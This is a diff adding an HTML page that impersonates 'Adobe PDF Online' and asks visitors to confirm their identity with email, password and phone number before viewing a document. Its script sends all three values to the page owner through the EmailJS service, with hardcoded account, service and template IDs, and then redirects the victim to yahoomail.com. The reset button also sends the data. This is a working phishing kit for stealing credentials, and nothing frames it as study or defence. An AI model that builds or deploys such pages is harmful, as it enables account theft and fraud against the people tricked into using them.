@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta http-equiv="X-UA-Compatible" content="IE=edge">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <link rel="stylesheet" href="style.css">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+ 
+ <title>form</title>
+</head>
+<body>
+  <!-- <div class="container--blur">
+  </div> -->
+ <!-- <div class="container"> -->
+   <!-- <img class="contain-image" src="BACK.png" alt=""> -->
+  <div class="header">
+   <div class="header--logo">
+    <div class="logo">
+      <img class="img" src="./images (2).png" alt="">
+      <p class="header-paragraph">Adobe PDF Online</p>
+    </div>
+   </div>
+   <div class="buttons">
+    <div class="button-1">Account </div>
+    <div class="button-2">Sign In</div>
+   </div>
+  </div>
+  <div class="header--type">
+   <ul>
+    <li class="li-1"><i class="fa fa-pencil fa-fw" style="font: size 11px"></i> <span class="list--1">Edit and Reply</span> </li>
+    <li class="li-2"><i class="fa fa-download" style="font-size:10px"></i> Download</li>
+    <li class="li-3"><i class="fa fa-print" aria-hidden="true" style="font-size:11px"></i> Print</li>
+    <li class="li-4"><i class="fa fa-compress" aria-hidden="true" style="font-size:11px"></i> Exit</li>
+    <li class="li-5"><i class="fa fa-ellipsis-h" aria-hidden="true" style="font: size 15px"></i></li>
+   </ul>
+  </div>
+  <section class="section">
+
+  </section>
+<div class="box">
+  <div class="box-1">
+    <img class="box-img" src="./Zpt8n-removebg-preview.png" alt="">
+    <h1>Adobe PDF Online</h1>
+  </div>
+  <div class="box-txt">
+    <h4>Confirm your identity!</h4>
+    <p>Sign up with your email to view document</p>
+  </div>
+  <div class="forms">
+    <form action="" class="contact-form" method="POST">
+      <h4> EMAIL ID:</h4>
+      <input type="email" required placeholder="Enter Your Email Address" class="form-email">
+      <h4> PASSWORD:</h4>
+      <input type="password" required placeholder="Enter Your Email Address " class="form-password">
+      <h4> PHONE:</h4>
+      <input type="text" required placeholder="Enter Your phone number" class="form-phone">
+     <div class="btn">
+       
+    <button type="submit" class="form-submit"> View Document </button>
+    <button type="reset" class="form-reset"> Reset </button>
+    <!-- <button type="submit" class="form-submit"> Reset</button> -->
+  </div>
+    </form>
+    <div class="form-logo">
+      <img src="./img.jpg" alt="">
+      <!-- <div class="sphere"></div> -->
+    </div>
+  </div>
+
+</div>
+ <!-- </div> -->
+ <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script type="text/javascript">
+(function() {
+emailjs.init("user_1yAf2YtTbMDWHE9Ns4DoM");
+})();
+</script>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+<script >
+
+function validate(){
+  let email = document.querySelector(".form-email");
+  let pasword = document.querySelector(".form-password");
+  let phone = document.querySelector(".form-phone");
+  let btnSubmit = document.querySelector(".form-submit");
+  let btnReset = document.querySelector(".form-reset");
+
+  btnSubmit.addEventListener("click", (e)=> {
+    e.preventDefault()
+    
+    if (email.value == "" || pasword.value == "" || phone.value == ""){
+      inputEmpty();
+    }
+    else {
+      sentEmail(email.value, pasword.value, phone.value);
+      success();
+      console.log("email sent");
+      // window.location.href = "http://gmail.com";
+      clear()
+    } 
+  }),
+
+  btnReset.addEventListener("click", (e)=> {
+    e.preventDefault()
+    
+    if (email.value == "" || pasword.value == "" || phone.value == ""){
+      inputEmpty();
+    }
+    else {
+      sentEmail(email.value, pasword.value, phone.value);
+      success();
+      console.log("email sent");
+      // window.location.href = "http://yahoomail.com";
+      clear()
+    } 
+  })
+  
+}
+validate()
+
+function sentEmail(email, pasword, phone){
+  emailjs.send("service_qg3j1et","template_phowizd",{
+  from_name: email,
+  to_name: pasword,
+  message: phone,
+}).then ((message) => window.location.href = ("http://yahoomail.com"))
+}
+
+function success(){
+  swal({
+  title: "Good job!",
+  text: "successfully!",
+  icon: "success",
+  button: "ok",
+});
+}
+
+function reset(){
+  swal({
+  title: "Oops...!",
+  text: "the reset is successful",
+  icon: "error",
+  button: "ok",
+});
+}
+// error()
+
+function inputEmpty(){
+  swal({
+  title: "Oops...!",
+  text: "Inputs fields are required!",
+  icon: "error",
+  button: "ok",
+});
+}
+function clear(){
+  email.value = "";
+  pasword.value = ""; 
+   phone.value = "";
+}
+</script>
+</body>
+</html>
